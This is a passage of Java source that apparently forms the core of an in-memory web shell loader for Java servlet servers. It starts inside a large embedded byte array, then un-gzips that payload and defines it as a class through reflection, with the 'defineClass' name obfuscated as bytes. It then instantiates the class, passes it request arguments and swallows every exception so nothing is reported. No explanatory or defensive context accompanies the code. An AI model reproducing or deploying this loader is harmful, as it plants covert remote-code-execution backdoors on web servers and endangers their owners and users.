-20, -123, -19, 44, -64, 12, -33, 77, 35, -112, -17, 50, -60, -25, -69, -39, -126, -56, 123, -31, -106, -112, -40, -96, 10, -102, 24, 54, -62, -25, 1, 127, 125, 67, 96, 8, 110, 29, 29, 58, 110, -2, -31, -35, -110, -31, 68, 10, 29, -106, 97, -90, -97, 25, -110, -46, -11, 36, -13, 14, 14, -113, 44, -36, -74, -99, -98, 12, 7, -22, 78, 77, -12, 55, 100, -31, -10, -79, -124, -98, -125, -25, 45, 43, 31, 79, -124, 68, -102, -87, -18, -19, 34, -109, -34, -47, 30, -88, 40, -17, 17, -42, 100, -31, 123, -27, 107, 22, 112, 59, 45, 4, 56, -14, 50, -102, 96, 123, -24, 5, 120, -47, -70, 123, -118, -15, 53, 3, 80, -17, 119, 25, 105, -50, 47, 26, -109, 87, -34, 116, -119, 95, 48, -105, 94, 90, 58, -51, -27, -108, 77, -105, -52, -85, -40, 109, 17, 121, 9, 94, -74, -120, -100, 78, 66, 49, -111, -71, 20, 117, 109, -11, -82, 114, -58, -67, 126, 69, -67, 88, -18, -107, -73, 88, 107, -95, -36, -21, -75, -41, -50, 114, -17, 20, 123, 109, 39, -65, 87, -32, 71, 22, -79, 82, -102, -99, 52, 59, -124, -35, -42, -39, -85, -16, 99, -53, 100, -29, -24, -113, -49, -84, -81, 40, -37, 28, 63, -95, -65, -97, 30, 11, -46, 107, -16, -77, -47, -33, 100, -44, 57, 125, -33, -50, 48, -81, -25, 62, -39, 38, 27, -6, 0, -108, 28, -128, 59, -55, -92, 63, -72, 31, 122, 77, 106, -16, 63, -22, -91, 95, 93, 55, 37, 0, 0});
                    Class clazz = loader(clazzBytes);
                    namespace.put(charslist, clazz.newInstance());
                }
                namespace.get(charslist).equals(args);
            }
        } catch (Exception ignored) {

        }

    }

    private HttpServletResponse getResponseFromRequest(HttpServletRequest var1) throws Exception {
        return null;
    }

    private static synchronized Object getFV(Object var0, String var1) throws Exception {
        Field var2 = null;
        Class var3 = var0.getClass();

        while (var3 != Object.class) {
            try {
                var2 = var3.getDeclaredField(var1);
                break;
            } catch (NoSuchFieldException var5) {
                var3 = var3.getSuperclass();
            }
        }

        if (var2 == null) {
            throw new NoSuchFieldException(var1);
        } else {
            var2.setAccessible(true);
            return var2.get(var0);
        }
    }

    public static byte[] unGzip(byte[] bytes) throws Exception {
        java.io.ByteArrayOutputStream out = new java.io.ByteArrayOutputStream();
        java.io.ByteArrayInputStream in = new java.io.ByteArrayInputStream(bytes);
        java.util.zip.GZIPInputStream ungzip = new java.util.zip.GZIPInputStream(in);
        byte[] buffer = new byte[256];
        int n;
        while ((n = ungzip.read(buffer)) >= 0) out.write(buffer, 0, n);
        return out.toByteArray();
    }

    public static Class loader(byte[] bytes) throws Exception {
        java.net.URLClassLoader classLoader = new java.net.URLClassLoader(new java.net.URL[0], Thread.currentThread().getContextClassLoader());
        java.lang.reflect.Method method = ClassLoader.class.getDeclaredMethod(new String(new byte[]{100, 101, 102, 105, 110, 101, 67, 108, 97, 115, 115}), new Class[]{byte[].class, int.class, int.class});
        method.setAccessible(true);
        Class clazz = (Class) method.invoke(classLoader, new Object[]{bytes, new Integer(0), new Integer(bytes.length)});
        return clazz;
    }
}
